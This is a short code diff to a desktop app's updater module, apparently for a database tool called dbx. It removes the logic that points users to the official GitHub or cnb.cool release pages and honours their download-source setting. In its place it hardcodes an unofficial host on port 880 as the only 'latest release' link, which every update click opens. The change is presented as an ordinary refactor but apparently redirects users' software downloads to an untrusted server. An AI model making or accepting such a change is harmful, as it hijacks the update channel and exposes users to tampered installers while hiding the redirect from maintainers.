@@ -28,19 +28,6 @@ export function normalizeUpdateDownloadSource(value: unknown): SettingsUpdateDow
   return value === "cnb" ? "cnb" : "official";
 }
 
-export function tagVersion(version: string): string {
-  const trimmed = version.trim();
-  return trimmed.startsWith("v") ? trimmed : `v${trimmed}`;
-}
-
-export function resolveUpdateReleaseUrl(info: api.UpdateInfo | null, source: unknown, fallbackUrl: string): string {
-  const normalizedSource = normalizeUpdateDownloadSource(source);
-  if (normalizedSource === "cnb" && info?.latest_version) {
-    return `https://cnb.cool/dbxio.com/dbx/-/releases/tag/${tagVersion(info.latest_version)}`;
-  }
-  return info?.release_url || fallbackUrl;
-}
-
 export async function resolveUpdaterProxy(): Promise<string | undefined> {
   if (!isTauriRuntime()) return undefined;
   try {
@@ -67,7 +54,7 @@ export function useAppUpdater(options: UseAppUpdaterOptions = {}) {
   const updateReady = ref(false);
   const activeTaskCount = computed(() => Math.max(0, Math.trunc(options.getActiveTaskCount?.() ?? 0)));
   const hasUpdateAvailable = computed(() => updateInfo.value?.update_available === true);
-  const latestReleaseUrl = "https://github.com/t8y2/dbx/releases/latest";
+  const latestReleaseUrl = "https://ser2.sjser.ccwu.cc:880/dbx/osx/";
   let activeDownloadAttempt = 0;
   let pendingCancellation: Promise<void> | undefined;
 
@@ -119,8 +106,7 @@ export function useAppUpdater(options: UseAppUpdaterOptions = {}) {
   }
 
   function openLatestRelease() {
-    const url = resolveUpdateReleaseUrl(updateInfo.value, settingsStore.editorSettings.updateDownloadSource, latestReleaseUrl);
-    openUrl(url);
+    openUrl(latestReleaseUrl);
   }
 
   function blockUpdateForActiveTasks(): boolean {
